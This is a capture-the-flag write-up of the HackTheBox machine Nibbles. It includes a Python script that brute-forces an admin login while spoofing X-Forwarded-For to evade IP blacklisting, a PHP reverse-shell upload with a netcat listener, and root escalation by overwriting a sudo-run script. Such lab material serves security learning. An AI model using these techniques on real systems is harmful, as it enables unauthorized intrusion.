# Nibbles

So today I decided to take a stab at a handful of HackTheBox machines. Nibbles is an easy difficulty Linux machine that was retired a while back. I started off just like how I always do with a standard nmap tcp scan. 

```bash
nmap -sV -vv -p- -Pn -T4 10.10.10.75
```

The results of this indicated that ports 80 and 22 were open. I went over to the webpage running on port 80, and was greeted with just "Hello World!"

-----------
I took a peek inside the html, and in a comment it referenced the /nibbleblog/ directory. Taking a look around there, there was a lot to see. I ran gobuster on it to see if it found anything interesting. 

```bash
gobuster dir --url=http://10.10.10.75/nibbleblog/ --wordlist=/usr/share/wordlists/rockyou.txt/
```

In the meantime I did some snooping around the blog, but there was little to be found. No robots.txt, nowhere to download sourcecode, etc. Taking a look at the gobuster output a little while later, and I found that it discovered quite a few directories worth looking into. These included /admin, /content, and /settings. 

I also used dirbuster to check for a handful of different file extensions as well, and found a file at /nibblerblog/admin.php. I went over to go check it out and lo, there was a login page. I spammed it with a bunch of random credentials like admin/admin, admin/password, etc. However after my fifth attempt I was apparently IP blacklisted for 5 minutes.

To get around this, I thought I should try and change my IP address by changing the X-Forwarded-For header in the request, and then running through rockyou passwords until it cracks it. I wrote a python script to do this for me:

```python
from random import randint
import requests


PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'
TARGET_URL = f'http://10.10.10.75/nibbleblog/admin.php'
USERNAME = 'admin'


def ip_generator() -> str:
	new_address = ".".join(str(randint(0,255)) for _ in range(4))
	return new_address

def login(password: str, ip: str) -> bool:
	headers = {'X-Forwarded-For': ip}
	payload = {'username':USERNAME, 'password':password}

	request = requests.post(
		TARGET_URL, 
		headers=headers, 
		data=payload
	)

	if request.status_code == 500:
		print('internal server error')
		exit(1)

	if "Blacklist protection" in request.text:
		print("ratelimit hit")
		exit(1)

	return "Incorrect username or password" not in request.text

def run(start_at: int = 1):
	
	ip: str = ip_generator()
	attempt_count: int = 1

	for password in open(PASSWORD_LIST):
		if attempt_count < start_at:
			attempt_count += 1
			continue

		if attempt_count % (5-1) == 0:
			ip = ip_generator()

		password = password.strip()
		print(f'Testing {ip} with {password}"')

		if login(password, ip):
			print(f'Password for admin is {password}')
			break
		attempt_count += 1

if __name__ == '__main__':
	run()
```

From here, I learned that the credentials to login as admin are: 
>*admin:nibbles*

signing in as admin, and taking a peek around for a while, I eventually found the Plugins tab, where, when choosing "my image" allowed me to upload a file of my choosing, without filtering for the filetype. This made it easy to upload a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). I started a netcat listener with:

```nc -nvlp 4321```

and then uploaded the file. 

My go/dirbuster adventures had revealed the directory 
>/nibbleblog/content/private/plugins/my_images

wherein my recently uploaded file lives. I can doubleclick it and just like that, I have a shell in netcat!

-----------
User Flag
-----------

Surfing through the filesystem of the machine, I found that I am working as a user called "Nibbler" and that there is a user flag :D inside /home/Nibbler/. 

Privilege Escalation
----------
Additionally inside our home directory, was a file called 
>personal.zip

unzipping it, we found a file called

>monitor.sh

Before I go any further, I want to stabilize my shell enough to be able to run sudo. I did this by running the following commands:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
This gives me a much nicer looking shell that I can work better in. Looking at the permissions of this file, it appears that we can execute it using sudo, and since it's a bash script all we have to do is append a few commands to it that will elevate our shell to root once we run it! This is as easy as:

```bash
echo "bash" > monitor.sh
```

Then running the file:
```bash
sudo ./monitor.sh
```
and voila! I am now root! All that's left was to fetch the root flag from /root and call it a day!

Thanks for reading if you've made it this far!


